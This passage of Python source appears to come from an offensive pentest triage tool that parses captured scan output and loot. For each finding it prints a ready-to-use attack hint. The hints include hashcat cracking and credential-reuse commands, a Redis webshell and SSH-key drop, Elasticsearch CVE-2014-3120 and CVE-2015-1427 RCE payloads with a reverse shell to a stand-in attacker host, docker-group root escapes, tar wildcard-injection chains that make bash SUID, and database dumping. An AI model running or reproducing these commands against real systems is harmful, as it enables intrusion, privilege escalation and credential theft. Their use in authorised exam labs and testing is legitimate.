                               f"{_full_hash[:60]}"
                               f"{'...' if len(_full_hash) > 60 else ''}",
                               hint=(f"hashcat -m {_mode} <hash.txt> "
                                     f"rockyou.txt  |  IMAP: `curl -k "
                                     f"imaps://<host> -u '{_u_sh_dov}:<pw>'`"
                                     f"  |  mail creds commonly reused for "
                                     f"OS login / SMB / webmail"))
                    HASHES.append((_mode, _algo, _full_hash, path, _ln(m)))
                elif scheme in ("PLAIN", "CLEARTEXT", "CLEAR"):
                    # Explicit-plaintext scheme.
                    _p_sh_dov = val.replace("'", "'\\''")
                    report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                               f"Dovecot mailbox cleartext [{user}]: {val}",
                               hint=(f"curl -k imaps://<host> -u "
                                     f"'{_u_sh_dov}:{_p_sh_dov}'  |  also "
                                     f"try SMB/OS reuse - mail passwords "
                                     f"commonly recycled"))
                    if store is not None:
                        store.add(Evidence(kind="plaintext", user=user,
                                           plaintext=val, source=path,
                                           line=_ln(m)))
            else:
                # No scheme prefix - default is whatever default_pass_scheme
                # is set to (often CRYPT). We can't tell without seeing the
                # config, so treat as cleartext ONLY when it looks like
                # cleartext (not a $-crypt-style hash string).
                if val.startswith("$") and val.count("$") >= 3:
                    # crypt(3) format - inherit sha512crypt as most common.
                    _mode, _algo = "", "crypt (Dovecot default)"
                    if val.startswith("$6$"):
                        _mode, _algo = "1800", "sha512crypt (Dovecot default)"
                    elif val.startswith("$5$"):
                        _mode, _algo = "7400", "sha256crypt (Dovecot default)"
                    elif val.startswith("$1$"):
                        _mode, _algo = "500", "md5crypt (Dovecot default)"
                    elif val.startswith("$2"):
                        _mode, _algo = "3200", "bcrypt (Dovecot default)"
                    if _mode:
                        report.add("CRITICAL", "PASSWORD HASHES", path,
                                   _ln(m),
                                   f"Dovecot mailbox hash [{user}] ({_algo}): "
                                   f"{val[:60]}"
                                   f"{'...' if len(val) > 60 else ''}",
                                   hint=(f"hashcat -m {_mode} <hash.txt> "
                                         f"rockyou.txt  |  IMAP: `curl -k "
                                         f"imaps://<host> -u "
                                         f"'{_u_sh_dov}:<pw>'`"))
                        HASHES.append((_mode, _algo, val, path, _ln(m)))
                else:
                    # Looks like cleartext.
                    _p_sh_dov = val.replace("'", "'\\''")
                    report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                               f"Dovecot mailbox cleartext [{user}]: {val}",
                               hint=(f"curl -k imaps://<host> -u "
                                     f"'{_u_sh_dov}:{_p_sh_dov}'  |  also "
                                     f"try SMB/OS reuse - mail passwords "
                                     f"commonly recycled"))
                    if store is not None:
                        store.add(Evidence(kind="plaintext", user=user,
                                           plaintext=val, source=path,
                                           line=_ln(m)))

    # iter-209: FreeRADIUS clients.conf shared secrets. Filename-gated so
    # `secret = <value>` prose in any other file doesn't fire. The
    # content-signal fallback catches oddly-named RADIUS config dumps.
    _rad_gate = (_base_pfx in ("clients.conf", "clients.d",
                                "radiusd.conf", "raddb.conf")
                 or "/freeradius/" in _plow_pfx
                 or "/raddb/" in _plow_pfx
                 or "/radius/" in _plow_pfx
                 or ("client " in text[:8192]
                     and re.search(r'(?i)\bradiusd\b|\bfreeradius\b',
                                    text[:8192])))
    if _rad_gate and not filters.is_doc_file(path):
        _rad_seen = set()
        for m in _RADIUS_CLIENT.finditer(text):
            cname = m.group(1).strip().strip('"\'')
            secret = m.group(2).strip()
            if (cname, secret) in _rad_seen:
                continue
            _rad_seen.add((cname, secret))
            # Reject default/sample secrets that ship with FreeRADIUS.
            # `testing123` is the literal example in the shipped config -
            # if we see it, either it's the untouched default (still worth
            # flagging as LOW misconfig) OR it's a tutorial paste. Skip.
            if filters.is_placeholder(secret):
                continue
            if secret.lower() in ("testing123", "radiuspass", "secret",
                                   "password", "changeme"):
                # Still flag as HIGH - default secrets ARE a lateral vector
                # but they're not exam credentials. Report at HIGH severity
                # with a "default secret" note.
                report.add("HIGH", "CRED PAIRS", path, _ln(m),
                           f"FreeRADIUS default/weak client secret "
                           f"[{cname}]: {secret}",
                           hint=(f"default secret in shipped FreeRADIUS - "
                                 f"AP/switch/VPN concentrators reusing this "
                                 f"can be auth'd to via any tool; try `nxc "
                                 f"ssh <ap-mgmt> -u admin -p '{secret}'`"))
                continue
            _sec_sh_rad = secret.replace("'", "'\\''")
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"FreeRADIUS client secret [{cname}]: {secret}",
                       hint=(f"radclient -x <radius-host>:1812 auth "
                             f"'{_sec_sh_rad}'  |  RADIUS shared secrets "
                             f"commonly reused as AP/switch/firewall "
                             f"console admin password - try SSH/HTTPS "
                             f"admin panel of {cname} with this value"))
            if store is not None:
                store.add(Evidence(kind="plaintext", plaintext=secret,
                                   host=cname, source=path, line=_ln(m)))

    # iter-210: Redis 6379 UNAUTH scan/loot output. Requires TWO signals
    # for HIGH confidence:
    #   (a) `redis_version:` line (INFO output) OR `<host>:<port>>` prompt
    #   (b) NOT a redis.conf (would have `# Redis version` prose header)
    #   (c) NOT a compose/dockerfile (image tag lines)
    #   (d) `NOAUTH Authentication required` NOT nearby (indicates auth on)
    # These constraints keep this specific to captured scan output where
    # the operator has confirmed no-auth access.
    _plow_rd = _plow_pfx
    _base_rd = _base_pfx
    _redis_gate_skip = (
        _base_rd in ("redis.conf", "docker-compose.yml", "docker-compose.yaml",
                      "compose.yaml", "compose.yml", "dockerfile")
        or _plow_rd.endswith((".dockerfile", ".containerfile"))
        or "/redis/redis.conf" in _plow_rd)
    if not _redis_gate_skip and not filters.is_doc_file(path):
        # Skip on any file where NOAUTH is prominent - Redis is auth'd there.
        _noauth_ct = text[:16384].count("NOAUTH")
        # We accept up to 1 NOAUTH mention (documentation might reference it)
        # but 2+ suggests active auth challenges in the log.
        if _noauth_ct <= 1:
            # Signal (a): redis_version line = INFO response.
            for m in _REDIS_UNAUTH_INFO.finditer(text):
                # Anchor context - check the surrounding 200 chars don't
                # look like a redis.conf header comment.
                _s = max(0, m.start() - 100)
                _e = min(len(text), m.end() + 100)
                _ctx = text[_s:_e]
                if "# Redis version" in _ctx or "# redis_version" in _ctx:
                    continue
                ver = m.group(1)
                # Try to infer host from the file - look for the prompt in
                # the same doc.
                _hp_m = _REDIS_CLI_PROMPT.search(text[:16384])
                if _hp_m:
                    _host, _port = _hp_m.group(1), _hp_m.group(2)
                    _target = f"{_host}:{_port}"
                else:
                    _target = "<redis-host>:6379"
                report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(m),
                           f"Redis {ver} UNAUTH access confirmed via INFO "
                           f"({_target})",
                           hint=(f"redis-cli -h {_target.split(':')[0]} "
                                 f"-p {_target.split(':')[1] if ':' in _target else '6379'}"
                                 f"  |  SSH key drop: "
                                 f"CONFIG SET dir /home/redis/.ssh/; "
                                 f"CONFIG SET dbfilename authorized_keys; "
                                 f"SET x \"\\n\\nssh-rsa AAAA...\\n\\n\"; "
                                 f"SAVE  |  webshell: "
                                 f"CONFIG SET dir /var/www/html/; "
                                 f"CONFIG SET dbfilename shell.php; "
                                 f"SET x '<?php system($_GET[c]);?>'; SAVE"))
                # One is enough - a scan output only needs one detection.
                break

            # Signal (b): redis-cli prompt directly = interactive foothold
            # confirmed. Emit only when we DIDN'T already emit from INFO.
            if not any("Redis" in f['detail'] and "UNAUTH" in f['detail']
                       for f in report.findings[-5:]):
                _pm = _REDIS_CLI_PROMPT.search(text)
                if _pm:
                    # Check what's after the prompt - a real interactive
                    # session has commands like INFO, PING, CONFIG, SET.
                    _after = text[_pm.end():_pm.end() + 1000]
                    if re.search(r'\b(?:INFO|PING|CONFIG|KEYS|SET|GET|'
                                  r'FLUSHALL|SAVE|CLIENT|ACL)\b', _after):
                        _host_p, _port_p = _pm.group(1), _pm.group(2)
                        # Ignore obviously-fake hosts.
                        # iter-222 audit fix: MongoDB shell prompt has
                        # the SAME shape (`<host>:27017>`), and captured
                        # loot may include uppercase SET/GET as part of
                        # mongodb setter/getter calls or comments. Reject
                        # when the port is a canonical Mongo port so the
                        # Mongo-unauth detector handles it instead.
                        _is_mongo_port = _port_p in ("27017", "27018", "27019")
                        _is_ssh_localhost = (
                            _host_p in ("localhost", "127.0.0.1")
                            and _port_p == "22")
                        if not _is_mongo_port and not _is_ssh_localhost:
                            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                                       _ln(_pm),
                                       f"Redis interactive session on "
                                       f"{_host_p}:{_port_p} (unauth "
                                       f"connect - captured redis-cli)",
                                       hint=(f"redis-cli -h {_host_p} -p "
                                             f"{_port_p}  |  see INFO "
                                             f"hint above for RCE chain"))

    # iter-211: MongoDB 27017 UNAUTH scan/loot capture. Mirror of the
    # Redis unauth pattern - captured mongo/mongosh output showing a
    # command succeeded without auth is a HIGH intel item because it
    # unlocks mongodump extraction + user-collection reads that often
    # contain reused OS/webapp creds.
    _mongo_gate_skip = (
        _base_rd in ("mongod.conf", "mongo.conf", "docker-compose.yml",
                      "docker-compose.yaml", "compose.yaml", "compose.yml",
                      "dockerfile")
        or _plow_rd.endswith((".dockerfile", ".containerfile"))
        or "/mongod.conf" in _plow_rd)
    if not _mongo_gate_skip and not filters.is_doc_file(path):
        # Anti-signal: presence of mongo auth errors means the target IS
        # auth-gated. Two or more mentions and we skip entirely.
        _mongo_deny_ct = (
            text[:16384].count("not authorized")
            + text[:16384].count("Authentication failed")
            + text[:16384].count("requires authentication")
            + text[:16384].count("Unauthorized"))
        if _mongo_deny_ct <= 1:
            # Signal (A): `show dbs` output rows. Need >=2 of admin/local/
            # config to be confident this is captured output (not just a
            # single word appearing in prose).
            _dbs_rows = list(_MONGO_SHOW_DBS_ROW.finditer(text))
            _dbs_names = {r.group(1).lower() for r in _dbs_rows}
            _emitted_mongo = False
            if len(_dbs_names) >= 2:
                _first_row = _dbs_rows[0]
                # Try to find host:port context in the first 16 KB.
                _mh = re.search(
                    r'(?im)(?:mongodb://|Connected\s+to:|>\s*)'
                    r'([\w\-.]{2,60}):(2701[7-9])', text[:16384])
                _target = (f"{_mh.group(1)}:{_mh.group(2)}"
                           if _mh else "<mongo-host>:27017")
                report.add("HIGH", "SECRET-SIDECHANNEL", path,
                           _ln(_first_row),
                           f"MongoDB UNAUTH access confirmed via `show dbs` "
                           f"({_target}) - {sorted(_dbs_names)}",
                           hint=(f"mongodump --host {_target} "
                                 f"--out /tmp/mongo-loot/  |  read users: "
                                 f"mongosh --host {_target} --eval "
                                 f"'db.getSiblingDB(\"admin\").system."
                                 f"users.find().pretty()'  |  webapp creds "
                                 f"in Mongo often reused as OS/SSH; "
                                 f"grep loot for password fields"))
                _emitted_mongo = True

            # Signal (B): `db.version()` returned a semver. Only emit when
            # (A) didn't already fire.
            if not _emitted_mongo:
                _dv = _MONGO_DB_VERSION.search(text)
                if _dv:
                    _ver = _dv.group(1)
                    _mh2 = re.search(
                        r'(?im)(?:mongodb://|Connected\s+to:|>\s*)'
                        r'([\w\-.]{2,60}):(2701[7-9])', text[:16384])
                    _target2 = (f"{_mh2.group(1)}:{_mh2.group(2)}"
                                if _mh2 else "<mongo-host>:27017")
                    report.add("HIGH", "SECRET-SIDECHANNEL", path,
                               _ln(_dv),
                               f"MongoDB {_ver} UNAUTH via db.version() "
                               f"({_target2})",
                               hint=(f"mongodump --host {_target2} "
                                     f"--out /tmp/mongo-loot/  |  see "
                                     f"above hint for user-collection read"))
                    _emitted_mongo = True

            # Signal (C): `MongoDB shell version` banner - only emit if
            # neither (A) nor (B) fired AND we can also see a subsequent
            # `>` prompt with real commands (not just the banner alone).
            if not _emitted_mongo:
                _mb = _MONGO_SHELL_BANNER.search(text)
                if _mb:
                    _after_mb = text[_mb.end():_mb.end() + 4096]
                    if re.search(r'(?m)^>\s*(?:show|use|db\.)', _after_mb):
                        # We saw the banner AND a subsequent command entered
                        # at the `>` prompt - the shell was interactive
                        # without auth challenge.
                        report.add("MEDIUM", "SECRET-SIDECHANNEL", path,
                                   _ln(_mb),
                                   f"MongoDB {_mb.group(1)} interactive "
                                   f"shell captured (unauth or auth'd - "
                                   f"check output rows for `show dbs`)",
                                   hint=("mongodump --host <host>:27017 "
                                         "--out /tmp/mongo-loot/  |  "
                                         "check output above for auth "
                                         "errors to confirm unauth"))

    # iter-212: Elasticsearch 9200 UNAUTH REST API. The tagline "You
    # Know, for Search" is dispositive - it appears ONLY in the JSON
    # response to `GET /` and only when no auth is required. Captured
    # curl output showing this = confirmed unauth ES access.
    _es_gate_skip = (
        _base_rd in ("elasticsearch.yml", "kibana.yml", "logstash.yml",
                      "apm-server.yml", "docker-compose.yml",
                      "docker-compose.yaml", "compose.yaml", "compose.yml",
                      "dockerfile")
        or _plow_rd.endswith((".dockerfile", ".containerfile"))
        or "/elasticsearch/config/" in _plow_rd)
    if not _es_gate_skip and not filters.is_doc_file(path):
        # Anti-signal: presence of ES auth errors = auth is on. Two or
        # more mentions and skip.
        _es_deny_ct = (
            text[:16384].count("security_exception")
            + text[:16384].count("missing authentication credentials")
            + text[:16384].count("401 Unauthorized")
            + text[:16384].count("unable to authenticate user"))
        if _es_deny_ct <= 1:
            _tm = _ES_UNAUTH_TAGLINE.search(text)
            if _tm:
                # Look for version in the same file - it's in the same
                # JSON body ~200-500 chars from the tagline.
                _vm = _ES_VERSION_NUMBER.search(text)
                _ver = _vm.group(1) if _vm else None
                # Look for host context.
                _eh = re.search(
                    r'(?i)https?://([\w][\w\-.]{1,60})(?::(9200|9300))?',
                    text[:16384])
                _target = (f"{_eh.group(1)}:{_eh.group(2) or '9200'}"
                           if _eh else "<es-host>:9200")
                # CVE hint based on version. iter-220: order-fix (the
                # prior <1.4.3 branch swallowed <1.2 too, so the MVEL
                # arm was unreachable) + inlined curl bodies so the
                # operator doesn't need to look up the exploit shape.
                _cve_hint = ""
                if _ver:
                    try:
                        _major, _minor, _patch = [
                            int(x) for x in (_ver.split(".") + ["0", "0"])[:3]
                        ]
                        if (_major, _minor, _patch) < (1, 2, 0):
                            _cve_hint = (
                                f"  |  CVE-2014-3120 MVEL RCE (ES <1.2): "
                                f"curl -s 'http://{_target}/_search' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"size\":1,\"script_fields\":"
                                f"{{\"pwn\":{{\"script\":\"import "
                                f"java.util.*; import java.io.*; def "
                                f"r=Runtime.getRuntime().exec([\\\"bash"
                                f"\\\",\\\"-c\\\",\\\"id\\\"] as "
                                f"String[]).text\"}}}}}}'  |  read: "
                                f".hits.hits[0].fields.pwn[0]")
                        elif (_major, _minor, _patch) < (1, 4, 3):
                            _cve_hint = (
                                f"  |  CVE-2015-1427 Groovy sandbox RCE "
                                f"(ES <1.4.3): curl -s "
                                f"'http://{_target}/_search' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"size\":1,\"script_fields\":"
                                f"{{\"pwn\":{{\"lang\":\"groovy\","
                                f"\"script\":\"Runtime.getRuntime()."
                                f"exec(\\\"id\\\").text\"}}}}}}'  |  "
                                f"read: .hits.hits[0].fields.pwn[0]"
                                f"  |  reverse shell: swap `id` for "
                                f"[bash,-c,'bash -i >& /dev/tcp/"
                                f"<ATTACKER>/4444 0>&1']")
                    except (ValueError, IndexError):
                        pass
                _ver_str = f" {_ver}" if _ver else ""
                report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_tm),
                           f"Elasticsearch{_ver_str} UNAUTH REST API "
                           f"confirmed ({_target})",
                           hint=(f"curl -s http://{_target}/_cat/indices?v"
                                 f"  |  dump index: "
                                 f"curl -s 'http://{_target}/<index>/_search"
                                 f"?size=1000&pretty' > loot.json"
                                 f"{_cve_hint}"))

            # Fallback signal: _cat/indices output rows (>=2) - captured
            # from `curl _cat/indices` without an auth challenge.
            if not _tm:
                _idx_rows = list(_ES_CAT_INDICES.finditer(text))
                if len(_idx_rows) >= 2:
                    _first_row = _idx_rows[0]
                    _eh2 = re.search(
                        r'(?i)https?://([\w][\w\-.]{1,60})(?::(9200|9300))?',
                        text[:16384])
                    _target2 = (f"{_eh2.group(1)}:{_eh2.group(2) or '9200'}"
                                if _eh2 else "<es-host>:9200")
                    _idx_names = sorted(
                        {r.group(3) for r in _idx_rows[:5]})
                    report.add("HIGH", "SECRET-SIDECHANNEL", path,
                               _ln(_first_row),
                               f"Elasticsearch UNAUTH via _cat/indices "
                               f"({_target2}) - {_idx_names}",
                               hint=(f"curl -s 'http://{_target2}/"
                                     f"{_idx_names[0]}/_search?"
                                     f"size=1000&pretty' > loot.json  |  "
                                     f"grep dumped indices for password/"
                                     f"apikey/token fields"))

    # iter-213: AJP Ghostcat (CVE-2020-1938). Captured nmap output
    # showing 8009/tcp + AJP13 = exam-legal LFI/RCE target on Tomcat.
    # No filename gate - Ghostcat can show up in operator notes, nmap
    # output, gnmap files, greppable scan captures. Doc-file gate
    # applies to avoid tutorial mentions.
    if not filters.is_doc_file(path):
        _ajp_targets = set()
        # Signal A: Apache Jserv fingerprint = confident Tomcat AJP.
        _jserv_m = _AJP_JSERV.search(text)
        # Signal B: 8009/tcp open ajp line - broader.
        _port_ms = list(_AJP_PORT_LINE.finditer(text))
        # Signal C: gnmap format `8009/open/tcp//ajp13/`
        _gnmap_ms = list(_AJP_GNMAP.finditer(text))
        # Deduplicate targets extracted from all signals.
        for _g in _gnmap_ms:
            _ajp_targets.add(_g.group(1).strip())
        # If we have any signal, emit one HIGH per target (or one
        # generic if no host known).
        _has_signal = bool(_jserv_m or _port_ms or _gnmap_ms)
        if _has_signal:
            # Try to find host from other patterns (nmap normal output
            # has `Nmap scan report for <host>`).
            _nm_hosts = re.findall(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            for _h in _nm_hosts:
                _ajp_targets.add(_h)
            if not _ajp_targets:
                _ajp_targets.add("<tomcat-host>")
            # Anchor line for the finding - prefer Jserv match, then
            # port line, then gnmap.
            _anchor = _jserv_m or (_port_ms[0] if _port_ms else _gnmap_ms[0])
            for _tgt in sorted(_ajp_targets)[:5]:
                report.add("HIGH", "SECRET-SIDECHANNEL", path,
                           _ln(_anchor),
                           f"AJP Ghostcat CVE-2020-1938 on {_tgt}:8009 "
                           f"(Tomcat AJP LFI+RCE, no auth)",
                           hint=(f"LFI (exam-legal manual): "
                                 f"ajpShooter.py {_tgt} 8009 "
                                 f"/WEB-INF/web.xml read  |  RCE via "
                                 f"file upload + eval: ajpShooter.py "
                                 f"{_tgt} 8009 /uploaded.jsp eval  |  "
                                 f"msf `auxiliary/admin/http/tomcat_"
                                 f"ghostcat` counts toward one-target "
                                 f"exam quota - prefer manual path  |  "
                                 f"targets: Tomcat <=9.0.31/8.5.51/"
                                 f"7.0.100 - grep web.xml for admin "
                                 f"creds + JDBC URLs after LFI"))

    # iter-214: RDP NLA-disabled + rdp-ntlm-info intel from nmap
    # scripts. Doc-file gate applies; no filename gate because these
    # signals live in nmap output that has many filename shapes.
    if not filters.is_doc_file(path):
        # Signal A: `Standard RDP Security: SUCCESS` = NLA not required.
        _rdp_std_m = _RDP_ENUM_STANDARD.search(text)
        if _rdp_std_m:
            # Try to find target host from surrounding context.
            _rdp_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _rdp_target = (_rdp_host_m.group(1) if _rdp_host_m
                            else "<rdp-host>")
            report.add("MEDIUM", "SECRET-SIDECHANNEL", path,
                       _ln(_rdp_std_m),
                       f"RDP NLA disabled on {_rdp_target}:3389 - "
                       f"Standard RDP Security accepted (pre-auth "
                       f"connect works)",
                       hint=(f"cred reuse: xfreerdp /u:<user> "
                             f"/p:<pw> /v:{_rdp_target}  |  spray "
                             f"FOUND creds (exam-legal, single try "
                             f"each): nxc rdp {_rdp_target} -u "
                             f"users.txt -p 'FoundPw!' --no-bruteforce"
                             f"  |  BlueKeep check: nmap "
                             f"--script rdp-vuln-ms12-020,"
                             f"rdp-enum-encryption -p3389 "
                             f"{_rdp_target}  |  NO online brute "
                             f"forcers (hydra/ncrack/crowbar/medusa "
                             f"are NOT exam-legal)"))

        # Signal B: rdp-ntlm-info fields - just gate on marker presence
        # and extract fields anywhere in the text (nmap script output
        # uses `|   Field: Value` line prefixes which broke a strict
        # block match).
        if "rdp-ntlm-info" in text[:65536]:
            _dom = re.search(
                r'(?i)(?:NetBIOS_Domain_Name|DNS_Domain_Name)\s*:\s*'
                r'([\w\-.]{1,60})', text[:16384])
            _cn = re.search(
                r'(?i)(?:NetBIOS_Computer_Name|DNS_Computer_Name)\s*'
                r':\s*([\w\-.]{1,60})', text[:16384])
            _pv = re.search(
                r'(?i)Product_Version\s*:\s*(\d+\.\d+\.\d+)', text[:16384])
            _bits = []
            if _dom:
                _bits.append(f"DOMAIN={_dom.group(1)}")
            if _cn:
                _bits.append(f"HOST={_cn.group(1)}")
            _bluekeep = ""
            if _pv:
                _ver_str = _pv.group(1)
                _bits.append(f"OS-ver={_ver_str}")
                try:
                    _mj, _mn, _bl = [int(x) for x in _ver_str.split(".")]
                    # 5.1=XP, 5.2=Server 2003, 6.0=Vista/2008,
                    # 6.1=Win7/2008R2 - all BlueKeep candidates.
                    if (_mj, _mn) in ((5, 1), (5, 2), (6, 0), (6, 1)):
                        _bluekeep = (f"  |  BlueKeep CVE-2019-0708 "
                                     f"candidate (OS {_ver_str}) - "
                                     f"nmap --script "
                                     f"rdp-vuln-ms12-020 confirms")
                except (ValueError, IndexError):
                    pass
            if _bits:
                # Anchor to the ntlm-info marker line.
                _anchor_m = re.search(r'(?i)rdp-ntlm-info', text)
                report.add("MEDIUM", "RECON", path, _ln(_anchor_m),
                           f"RDP host intel: {', '.join(_bits)}",
                           hint=(f"authenticated pivot: xfreerdp "
                                 f"/u:<domain>\\\\<user> /p:<pw> "
                                 f"/v:<rdp-host> /d:"
                                 f"{_dom.group(1) if _dom else '<domain>'}"
                                 f"  |  fill <rdp-host> with "
                                 f"{_cn.group(1) if _cn else 'HOST'}"
                                 f"{_bluekeep}"))

    # iter-216: Docker socket exposure = direct root primitive. Emits
    # HIGH when either (a) captured id/groups output shows docker
    # membership, or (b) an ls of /var/run/docker.sock is captured.
    # Doc-file gate applies; no filename gate because these signals
    # can appear in linpeas/lse/manual enum notes with many names.
    if not filters.is_doc_file(path):
        _docker_hit = False
        _idm = _DOCKER_GROUP_ID.search(text)
        if _idm:
            report.add("HIGH", "INTERESTING FILES", path, _ln(_idm),
                       "docker group membership (direct root escape)",
                       hint=("docker run --rm -it -v /:/mnt alpine "
                             "chroot /mnt sh  |  or without pull: "
                             "docker run --rm -it -v /:/mnt "
                             "$(docker images -q | head -1) "
                             "chroot /mnt sh  |  no auth needed - "
                             "docker socket is world-writable to group"))
            _docker_hit = True
        # /etc/group entry: `docker:x:999:user1,user2` shows non-root
        # accounts with docker escape. Reuse a narrower pattern.
        if not _docker_hit:
            _grp_m = re.search(
                r'(?m)^docker:x:\d+:([\w,\-]{1,200})$', text)
            if _grp_m:
                _members = _grp_m.group(1).strip()
                if _members:
                    report.add("HIGH", "INTERESTING FILES", path,
                               _ln(_grp_m),
                               f"/etc/group docker members "
                               f"({_members[:60]}) - direct root escape",
                               hint=("docker run --rm -it -v /:/mnt "
                                     "alpine chroot /mnt sh  |  as any "
                                     f"of: {_members[:60]}"))
                    _docker_hit = True
        # iter-222 audit fix: `groups` command output detector was
        # defined but never wired. Now consulted when `id` output isn't
        # present but a captured `groups` line shows docker membership.
        if not _docker_hit:
            _gcm = _DOCKER_GROUPS_CMD.search(text)
            if _gcm:
                report.add("HIGH", "INTERESTING FILES", path, _ln(_gcm),
                           "docker group membership via `groups` cmd "
                           "output - direct root escape",
                           hint=("docker run --rm -it -v /:/mnt "
                                 "alpine chroot /mnt sh"))
                _docker_hit = True
        if not _docker_hit:
            _sm = _DOCKER_SOCK_LS.search(text)
            if _sm:
                report.add("HIGH", "INTERESTING FILES", path, _ln(_sm),
                           "/var/run/docker.sock present in captured "
                           "ls - direct root primitive",
                           hint=("docker -H unix:///var/run/docker.sock "
                                 "run --rm -v /:/mnt alpine chroot "
                                 "/mnt sh  |  needs docker CLI or curl "
                                 "--unix-socket /var/run/docker.sock "
                                 "http://localhost/containers/..."))
                _docker_hit = True

    # iter-216: wildcard-injection chain. Doc-file gate applies;
    # narrow filename gate to avoid tutorial FPs while still catching
    # cron/script/linpeas captures.
    _plow_wc = path.lower()
    _wc_gate = (_plow_wc.endswith(("crontab", "cron.d", "cron", ".sh",
                                     ".bash", ".zsh", ".cron", ".txt",
                                     ".log", ".md"))
                or "cron" in os.path.basename(_plow_wc)
                or "linpeas" in _plow_wc
                or "lse" in _plow_wc
                or "priv" in _plow_wc
                or "/etc/cron" in _plow_wc)
    if _wc_gate and not filters.is_doc_file(path):
        _wc_findings = []
        for m in _WILDCARD_TAR.finditer(text):
            _wc_findings.append(("tar", m))
        for m in _WILDCARD_CHOWN.finditer(text):
            _wc_findings.append(("chown", m))
        for m in _WILDCARD_CHMOD.finditer(text):
            _wc_findings.append(("chmod", m))
        for m in _WILDCARD_RSYNC.finditer(text):
            _wc_findings.append(("rsync", m))
        _seen_wc = set()
        for _kind, _m in _wc_findings[:5]:
            _line_txt = _m.group(0).strip()[:100]
            if _line_txt in _seen_wc:
                continue
            _seen_wc.add(_line_txt)
            if _kind == "tar":
                _atk = ("chain: cd <writable-dir>; "
                        "touch -- '--checkpoint=1'; "
                        "touch -- '--checkpoint-action=exec=sh /tmp/pwn.sh'; "
                        "echo 'chmod +s /bin/bash' > /tmp/pwn.sh; "
                        "chmod +x /tmp/pwn.sh")
            elif _kind == "chown":
                _atk = ("chain: cd <writable-dir>; "
                        "ln -s /root/.ssh/authorized_keys "
                        "'--reference=/tmp/mine'  |  or use "
                        "--from=<victim>:<victim> to hijack file "
                        "ownership")
            elif _kind == "chmod":
                _atk = ("chain: less useful than tar/chown but "
                        "--reference=/tmp/marker can propagate a "
                        "mode - drop a file with the target perms")
            else:  # rsync
                _atk = ("chain: cd <writable-dir>; touch -- '-e sh "
                        "/tmp/pwn.sh'  |  rsync -e triggers shell "
                        "exec on the source side")
            report.add("HIGH", "INTERESTING FILES", path, _ln(_m),
                       f"wildcard-injection candidate: {_line_txt}",
                       hint=(f"if this runs as a higher-priv user in a "
                             f"dir YOU can write: {_atk}"))

    # iter-223: SNMP UDP 161 intel. Three signals:
    #   (A) 161/udp open → MEDIUM baseline (community guess needed)
    #   (B) sysDescr.0 in snmpwalk output → HIGH confirmed community
    #   (C) onesixtyone hit row → HIGH with community + banner surfaced
    # Doc-file gate applies. No filename gate - captured SNMP output
    # can live in .txt / .nmap / .log / operator notes.
    if not filters.is_doc_file(path):
        _snmp_emitted = False
        # Signal C is highest-value (has community + banner) - try first.
        # iter-231 audit fix: pattern `<IP> [<word>] <text>` is too
        # generic - it FPs on port-scan exports like `10.0.0.1 [ssh]
        # Port 22 open` where the bracketed word is a service name,
        # not an SNMP community. Require an snmp-context signal in
        # the file: `onesixtyone`, `SNMP`, `.1.3.6.` OID prefix, or
        # `sysDescr`.
        _snmp_ctx_signal = re.search(
            r'(?i)\b(?:onesixtyone|SNMP|sysDescr|\.1\.3\.6\.\d)',
            text[:16384])
        _oh = _ONESIXTYONE_HIT.search(text) if _snmp_ctx_signal else None
        if _oh:
            _ip = _oh.group(1)
            _comm = _oh.group(2).strip()
            _banner = _oh.group(3).strip()[:100]
            _comm_sh = _comm.replace("'", "'\\''")
            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_oh),
                       f"SNMP community `{_comm}` on {_ip} (onesixtyone) "
                       f"- banner: {_banner[:60]}",
                       hint=(f"snmpwalk -v2c -c '{_comm_sh}' -mALL {_ip}  "
                             f"|  extract users: snmpwalk -v2c -c "
                             f"'{_comm_sh}' {_ip} .1.3.6.1.4.1.77.1.2.25"
                             f"  |  running procs: snmpwalk -v2c -c "
                             f"'{_comm_sh}' {_ip} .1.3.6.1.2.1.25.4.2  "
                             f"|  if rw: snmpset -v2c -c '{_comm_sh}' "
                             f"{_ip} <OID> i 1"))
            _snmp_emitted = True

        # Signal B: sysDescr.0 output = confirmed community.
        if not _snmp_emitted:
            _sd = _SNMP_SYS_DESCR.search(text)
            if _sd:
                _banner_b = _sd.group(1).strip()[:150]
                # Try to find target host + community from context.
                _snmp_ctx = re.search(
                    r'(?i)snmpwalk[^\r\n]*?-c\s+[\'"]?([\w.\-]{1,60})[\'"]?'
                    r'[^\r\n]*?([\d.]{7,15})',
                    text[:8192])
                if _snmp_ctx:
                    _comm_b = _snmp_ctx.group(1)
                    _host_b = _snmp_ctx.group(2)
                else:
                    _comm_b = "public"
                    _host_b = "<snmp-host>"
                _kernel_hint = ""
                if "Linux" in _banner_b:
                    _kernel_hint = (
                        "  |  kernel CVE hunt: match this Linux version "
                        "vs searchsploit `linux kernel <ver>`")
                elif "Windows" in _banner_b or "Microsoft" in _banner_b:
                    _kernel_hint = (
                        "  |  Windows CVE hunt: MS17-010, BlueKeep "
                        "CVE-2019-0708 depending on version")
                _comm_b_sh = _comm_b.replace("'", "'\\''")
                report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_sd),
                           f"SNMP community confirmed via sysDescr on "
                           f"{_host_b}: {_banner_b[:80]}",
                           hint=(f"snmpwalk -v2c -c '{_comm_b_sh}' "
                                 f"-mALL {_host_b}  |  users OID: "
                                 f".1.3.6.1.4.1.77.1.2.25  |  procs OID: "
                                 f".1.3.6.1.2.1.25.4.2  |  installed "
                                 f"software: .1.3.6.1.2.1.25.6.3.1.2"
                                 f"{_kernel_hint}"))
                _snmp_emitted = True

        # Signal A: bare 161/udp open → MEDIUM baseline.
        if not _snmp_emitted:
            _sp = _SNMP_PORT_LINE.search(text)
            if _sp:
                _snmp_host_m = re.search(
                    r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
